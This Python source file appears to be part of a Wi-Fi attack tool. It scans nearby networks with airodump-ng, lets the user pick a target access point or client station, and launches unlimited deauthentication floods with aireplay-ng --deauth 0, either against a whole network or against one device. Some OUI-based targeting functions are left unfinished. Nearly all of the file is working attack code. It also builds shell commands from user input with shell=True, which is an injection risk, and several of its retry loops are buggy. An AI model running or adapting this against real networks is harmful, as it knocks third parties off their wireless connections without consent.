import glob
import os
import signal
import subprocess
import time
import re
terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']

def clear():
    """
    runs clear command in shell

    clear command is used to clear the terminal screen
    """
    subprocess.run('clear')

def ansi_escape_red(string):
    """
    inputs a string and returns it with the color red

    use when in need for errors during print commands

    param string
    """
    return f'\033[91m{string}\033[0m'

def ansi_escape_green(string):
    """
    inputs a string and returns it with the color green

    use when in need for better visibility during print commands

    param string
    """
    return f'\033[92m{string}\033[0m'

def scan_for_networks(interface):
    """
    inputs a string and returns it with the color green

    use when in need for better visibility during print commands

    :param interface: user selected interface from the main.py

    CALLS: 0

    CALLED BY: main.py

    Depends on (uses) :
        - get_airodump_output(interface)

    """
    output = get_airodump_output(interface)
    if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
        print(output)
        print('==================================================================================================\n')
        while 1:
            targetAP = input(' Select a AP (SSID/ESSID) : ')
            for row in output.split('\n'):
                column = row.split()
                if len(column) >= 12 and (targetAP == column[10]):
                    return targetAP
            if targetAP == '999':
                return
            else:
                print(f'Selected AP ({ansi_escape_green(targetAP)}) does not exist. was it a mistype?')
                print(f'Type {ansi_escape_green("999")} to cancel AP selection')
    else:
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("scan_for_networks")}')
        print(f'There is a problem with {ansi_escape_red("get_airodump_output")}')
        print(ansi_escape_red(output))
        input(f'input anything to return to previous function \n')

def get_BSSID_and_Station_from_AP(interface, targetAP):
    """
    Runs airodump and saves the output to a variable called output.

    :param interface: is selected by user in main.py and used in airodump

    :param targetAP: is used through the output of airodump to match the BSSID and STATION
    :type targetAP: String

    :return:  BSSID and STATION
    :rtype: String

    CALLS: itself,

    CALLED BY: itself,

    """
    def recursion():
        selection = input('Rerun the Scan  Y/N ').lower()
        while selection != 'y' or selection != 'n':
            if selection == 'y':
                get_BSSID_and_Station_from_AP(interface, targetAP)
            elif selection == 'n':
                print(
                    '==================================================================================================\n')
                print(
                    f'this message is from {ansi_escape_green("get_BSSID_and_Station_from_AP")} No {ansi_escape_red("BSSID")} and {ansi_escape_red("CHANNEL")} will be returned this may cause issues if this function was called from another function \n')
                return  # this return is not enoguh on its own because when recursion is used return will return to the parent of that recursive function
                # so if we input 'Y' for 10 times we would need to input 'N' 10 times to actually return to the first function call
            else:
                recursion()
            return  # that's why we have a return here so that it returns to the first function call

    # save the output and error from airodump to variables
    print('Airodump is running. Wait a while for it to complete')
    airodump = subprocess.Popen('airodump-ng {}'.format(interface), shell=True,
                                preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # kill airodump after 10 seconds
    time.sleep(5)
    clear()
    os.killpg(airodump.pid, signal.SIGTERM)
    # .communicate() waits for the process to be completed. so it won't run until 'os.killpg(airodump.pid, signal.SIGTERM)' is successful.
    output, error = airodump.communicate()

    if isinstance(output, bytes):
        # there was an issue with the output and error, when ---> output = output.decode(encoding='utf-8') it gives ---> UnicodeDecodeError, invalid continuation byte
        # the solution is changing the encoding from 'utf-8' to 'latin-1'
        output = output.decode(encoding='latin-1')
    else:
        print('there was a issue running Airodump, check interface. if everything is okay rerun')
        recursion()

    print(output)
    print('==================================================================================================\n')

    # check if airodump found the target AP or not
    if targetAP not in output:
        # IF AN ERROR CAUSED TARGET AP TO BE NOT FOUND IN THE AIRODUMP DATA THEN THIS WILL RUN (example: inteface not found)
        if isinstance(error, bytes):
            error = error.decode(encoding='latin-1')
            if error:
                print(
                    f' There was an error with the airodump-ng. If you see networks listed above then there is no serious issue. Otherwise check the interface and the error')
                print(
                    f' Generally If you are seeing this then its a issue with the interface either its disconnected or you given a wrong name for the interface \n')
                # TODO do not allow selecting interfaces that are not on the output of ip link show
                print(f'ERROR: {ansi_escape_red(error)}')

        # IF NO ERRORS OCCOURED AND NETWORK SCAN WAS SUCCESSFUL BUT TARGET AP WAS NOT ON THE SCANNED NETWORK LIST THEN THIS WILL RUN
        print('==================================================================================================\n')
        print(f'{ansi_escape_green(targetAP)} was not found in scanned networks \n')
        print('But If you are seeing the networks then check connectivity of AP \n')
        recursion()
    # if airodump was successful in finding the targetAP
    else:

        # with split.('\n') make the output format in to lines/rows
        # this for loop will check each line going down
        for row in output.split('\n'):
            column = row.split()
            # the use of row.split() places comma ',' instead of all empty space
            # the column looks like this for nearly all APs when using airodump
            # ['BSSID', 'PWR', 'BEACONS', 'DATA', '/s', 'CHANNEL', '360', 'ENCRYPTION', 'CIPHER', 'AUTH', 'ESSID', '\x1b[0K']
            # but airodump records contain other things as well, so first we need to be sure it matches this pattern
            if len(column) >= 12 and (targetAP == column[10]) and ((column[0] and column[5]) != ''):
                targetAP_BSSID = column[0]
                targetAP_channel = column[5]
                print(
                    f' Target BSSID {ansi_escape_green(targetAP_BSSID)} \n CHANNEL {ansi_escape_green(targetAP_channel)}  \n AP {ansi_escape_green(targetAP)} \n \n Listing '
                    f'Devices in this AP Please Wait')
                return targetAP_BSSID, targetAP_channel
    return

def Deauth(interface, targetAP):

    """
    CALLS:
        : get_BSSID_and_Station_from_AP :


    CALLED BY: main.py

    :param interface:
    :param targetAP:
    :return:
    """
    try:
        targetAP_BSSID, targetAP_channel = get_BSSID_and_Station_from_AP(interface, targetAP)
        # switch to target channel
        switch_channel = subprocess.Popen(f'iwconfig {interface} channel {targetAP_channel}', shell=True)
        switch_channel.wait()

        # run aireplay in seperate terminal
        for terminal in terminals:
            aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} {interface}',shell=True)
            aireplay.wait()
            return

    except TypeError:
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("Deauth")}')
        print(f'There is a problem with {ansi_escape_red("get_BSSID_and_Station_from_AP")}')
        input(f'input anything to return to previous function \n')

def get_devices_in_AP_output(interface, targetAP):
    """

    runs airodump with :param interface: on a specific SSID (:param targetAP:) to get all devices connected to that SSID

    CALLS: 0

    CALLED BY:
        :scan_devices_in_AP_Select_Device:
        :deauth_devices_in_targetAP:
    :return: OUTPUT of airodump
    """
    try:
        targetAP_BSSID, targetAP_channel = get_BSSID_and_Station_from_AP(interface, targetAP)
        airodump = subprocess.Popen(f'airodump-ng -c {targetAP_channel} --bssid {targetAP_BSSID} {interface}',
                                    shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(10)
        clear()
        os.killpg(airodump.pid, signal.SIGTERM)
        output, error = airodump.communicate()
        if isinstance(output, bytes):
            clear()
            output = output.decode(encoding='latin-1')
            print(output + '\n')
            return output
    except TypeError:  # CANT CHECK /if (targetAP_BSSID and targetAP_channel) == None/ PYTHON DOES NOT ALLOW MULTIPLE VARIABLE ASSIGNENTS WITH NONE
        # basically a,b = None is not something that can be done thats why im using try expect. if else throws error
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("scan_devices_in_AP")}')
        print(f'There is a problem with {ansi_escape_red("get_BSSID_and_Station_from_AP")}')
        input(f'input anything to return to previous function \n')

def scan_devices_in_AP_Select_Device(interface, targetAP):

    """

    :param interface:
    :param targetAP:
    :return:
    """
    # run scan_devices_in_AP(interface,targetAP) to get output of airodump on target AP

    output = get_devices_in_AP_output(interface, targetAP)
    if not output:  # in this scenario I expect output to be None and None == false so...
        # also I don't have to use try except TypeError: like I did in scan_devices_in_AP because that error only comes from multiple assignment
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("scan_devices_in_AP_Select_Device")}')
        print(f'There is a problem with {ansi_escape_red("scan_devices_in_AP")}')
        input('input anything to return to previous function \n')
        return ''
    else:
        clear()
        print(output, '\n')
        target_device = input('type the Station of the target device : ')

        def check_if_selected_device_exist(target_device, output):  # recursion once again :)
            if target_device in output and target_device != '':
                return target_device
            else:
                print(f'{target_device} is not in the devices of this AP. Was it a mistype?')
                target_device = input('Retype the Station (type 999 to return to previous section: ')
                if target_device == '999':
                    return ''
                else:
                    check_if_selected_device_exist(target_device, output)

        check_if_selected_device_exist(target_device, output)
        return ''

def deauth_selected_device(interface, target_device, targetAP):
    try:
        global terminals
        # get bssid and channe;
        targetAP_BSSID, targetAP_channel = get_BSSID_and_Station_from_AP(interface, targetAP)
        # switch to target channel
        switch_channel = subprocess.Popen(f'iwconfig {interface} channel {targetAP_channel}', shell=True)
        switch_channel.wait()


        # run aireplay in seperate terminal
        for terminal in terminals:
            aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} -c {target_device} {interface}',shell=True)
            aireplay.wait() # ctrl+c on new terminal (or just closing it) will put the system to this place and then with return it will return to NetworkAttacks menu
            return
    except TypeError:
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("deauth_selected_device")}')
        print(f'There is a problem with {ansi_escape_red("get_BSSID_and_Station_from_AP")}')
        input(f'input anything to return to previous function \n')

def get_airodump_output(interface):
    def recursion():
        selection = input('Rerun the Scan  Y/N ').lower()
        while selection != 'y' or selection != 'n':
            if selection == 'y':
                get_airodump_output(interface)
            elif selection == 'n':
                print(
                    '==================================================================================================\n')
                print(
                    f'this message is from {ansi_escape_green("get_airodump_output")} No {ansi_escape_red("Output")} will be returned this may cause issues if this function was called from another function \n')
                return
            else:
                recursion()
            return
    print('Airodump is running. Wait a while for it to complete')
    airodump = subprocess.Popen('airodump-ng {}'.format(interface), shell=True,
                                preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(10)
    clear()
    os.killpg(airodump.pid, signal.SIGTERM)
    output,error = airodump.communicate()
    if isinstance(output, bytes):
        output = output.decode(encoding='latin-1')
        if ('Failed initializing wireless card(s)'.lower() in output.lower()):
            print(f'INTERFACE ERROR {ansi_escape_red(output)}')
            recursion()
        else:
            return output
    else:
        error.decode(encoding='latin-1')
        print(f'there was a issue running {ansi_escape_red("airodump-ng")}, check interface. if everything is okay rerun')
        print(f'ERROR {ansi_escape_red(error)}')
        recursion()


def get_airodump_output_OUI_formatted(interface):
    """
    th

    param interface
    """
    def recursion():
        selection = input('Rerun the Scan  Y/N ').lower()
        while selection != 'y' or selection != 'n':
            if selection == 'y':
                get_airodump_output_OUI_formatted(interface)
            elif selection == 'n':
                print(
                    '==================================================================================================\n')
                print(
                    f'this message is from {ansi_escape_green("get_airodump_output_OUI_formatted")} No {ansi_escape_red("OUI_output")} will be returned this may cause issues if this function was called from another function \n')
                return
            else:
                recursion()
            return
    print("OUIFormatter.sh is running. wait until it completes the scan (20s) ")
    # so it turns out I can just do capture_output=True,text=True and get an output without bytes and stuff
    shell = subprocess.run(f'./ShellScripts/OUIFormatter.sh {interface}',shell=True,capture_output=True,text=True)
    oui_output,oui_output_error = shell.stdout, shell.stderr
    clear()
    if ('Failed initializing wireless card(s)'.lower() in oui_output.lower()):
        print(f'INTERFACE ERROR {ansi_escape_red(oui_output)}')
        recursion()
    if oui_output_error:
        print(
            f'there was a issue running {ansi_escape_red("OUIFormatter.sh")}, check interface. if everything is okay rerun')
        print(f'ERROR {ansi_escape_red(oui_output_error)}')

        print(oui_output)
        print('an error occoured but If you see networks above then there is no problem (check above before the networks to see the error)')
        # selection = input('Rerun the Scan  Y/N ').lower()
        selection = 'n'
        while selection != 'y' or selection != 'n':
            if selection == 'y':
                get_airodump_output_OUI_formatted(interface)
            elif selection == 'n':
                return oui_output
    else:
        return oui_output

def scan_for_networks_by_OUI_Select_Router(interface):
    oui_output = get_airodump_output_OUI_formatted(interface) # as usual get the output first
    print('==================================================================================================\n')
    while 1:
        target_oui = input("Select an OUI from the output").replace(" ", "") # so that if user types 'XX:XX:XX   ' instead of 'XX:XX;XX' it still gets registered
        if target_oui in oui_output and len(target_oui) == 8: # the OUI lenght is 8 (XX:XX:XX) so if its in output and lenght is 8 then any mistrypes like emtpy space or anything that exist in output but not a mac address wil not be registered
            # however if a wifi has a SSID like 12345678 and user types 12345678 it will be a FALSE POSITIVE so nothing to do about that.
            # I may add a format to check too but its not necessary since if a user picks a wrong OUI it wont be usefull in deauth_by_OUI attack and user would have to choose the target OUI again.
            return target_oui
        elif target_oui == '999':
            return
        else:
            print(len(target_oui))
            print(f'Selected OUI ({ansi_escape_green(target_oui)}) does not exist. was it a mistype?')
            print(f'Type {ansi_escape_green("999")} to cancel OUI selection')

# TODO
def remove_ansi_escape_codes(input_text):
    ansi_escape = re.compile(r'\x1b\[[0-9;]*m')
    return ansi_escape.sub('', input_text)
def get_SSID_from_OUI(output, targetOUI):
    ssids = []
    lines = output.split('\n')
    current_oui = None  # Initialize current_oui outside the loop
    for line in lines: # f the selected oui is in the last element of the output list it will add ?25 to the list no idea why
        if line.startswith("OUI:"):
            current_oui = line.split()[1]
        elif current_oui == targetOUI and "{" in line:
            ssid_start_index = line.find("{") + 1
            ssid_end_index = line.find("}", ssid_start_index)  # Find ']' starting from ssid_start_index
            ssid = line[ssid_start_index:ssid_end_index].strip()
            if ssid:  # Check if ssid is not an empty string
                ssids.append(ssid)
    return [ssid for ssid in ssids if ssid]  # Exclude any empty elements
def Deauth_By_OUI(interface, targetOUI):
    oui_output = get_airodump_output_OUI_formatted(interface)
    oui_output = remove_ansi_escape_codes(oui_output)
    print(    get_SSID_from_OUI(oui_output, targetOUI))

        # print('==================================================================================================\n')
        # print(f'This message is from {ansi_escape_green("deauth_devices_in_targetAP_with_interval")}')
        # print(f'There is a problem with {ansi_escape_red("get_devices_in_AP_output")}')
        # input(f'input anything to return to previous function \n')
    # Selection
    # 1) Deauth all devices once and quit
    # 2) Deauth all devices roundrobin
    return


# TODO
def deauth_devices_in_targetAP(interface, targetAP):
    output = get_devices_in_AP_output(interface,targetAP)
    if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
        print(output)
    else:
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("deauth_devices_in_targetAP_with_interval")}')
        print(f'There is a problem with {ansi_escape_red("get_devices_in_AP_output")}')
        input(f'input anything to return to previous function \n')
    # Selection
    # 1) Deauth all devices once and quit
    # 2) Deauth all devices roundrobin
    return
